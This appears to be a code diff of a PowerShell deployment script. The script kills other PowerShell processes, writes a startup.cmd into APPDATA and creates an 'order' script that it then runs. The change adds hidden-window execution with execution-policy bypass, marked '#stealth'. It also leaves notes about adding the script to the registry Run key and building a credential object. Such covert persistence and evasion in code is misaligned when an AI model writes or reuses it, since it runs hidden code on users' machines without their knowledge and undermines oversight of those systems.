@@ -1,8 +1,9 @@
-[string]$Version = 10
+[string]$Version = 11
 #TODO update this version
 
 echo "Process script starting: $Pid"
 
+### Get credentials ###
 #$pass = ConvertTo-SecureString '' -AsPlainText -Force
 #$id=($env:UserName)
 #$cred = New-Object System.Management.Automation.PSCredential($id,$pass)
@@ -12,7 +13,7 @@ echo "Process script starting: $Pid"
 
 #\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #TODO add startup.cmd here
 
-### Kill all other ps process
+### Kill all other ps process ###
 Get-Process -Name "*PowerShell*" | ForEach-Object {
     if($_.Id -ne $Pid){
         echo "process $_ killed"
@@ -20,7 +21,7 @@ Get-Process -Name "*PowerShell*" | ForEach-Object {
     }
 }
 
-### Create starup.cmd
+### Create starup.cmd ###
 #[string]$path = "C:\"
 [string]$path = $env:APPDATA
 #[string]$FolderName = "\Test\"
@@ -41,14 +42,13 @@ $OrderPath
 #$ScriptPath = "$path"+"$FolderName"+"script.ps1"
 #$ScriptPath
 
-$StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"'
-#START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"'
+$StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"' #stealth
+#'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"'
 
 Add-Content $StartupCmdPath $StartupCode
 
-### Create order
-$OrderCode = '
-#PowerShell.exe -windowstyle hidden {
+### Create order ###
+$OrderCode = 'PowerShell.exe -windowstyle hidden {
 	echo "Process order starting: $Pid"
 	$update = $true
 	while($update){
@@ -89,8 +89,7 @@ $OrderCode = '
 	}
 	echo "Order completed: $Pid"
 	Stop-Process -Id $Pid -Force
-#}
-'
+}'
 	
 if(test-path($OrderPath)){
     Remove-Item -path $OrderPath
@@ -98,7 +97,7 @@ if(test-path($OrderPath)){
 New-Item -ItemType File -Path $OrderPath -Force
 Add-Content $OrderPath $OrderCode
 
-###Run order
+### Run order ###
 if(test-path($OrderPath)){
 	echo "invoking deployed order version: $Version"
 	powershell.exe -executionpolicy bypass -file "$OrderPath"
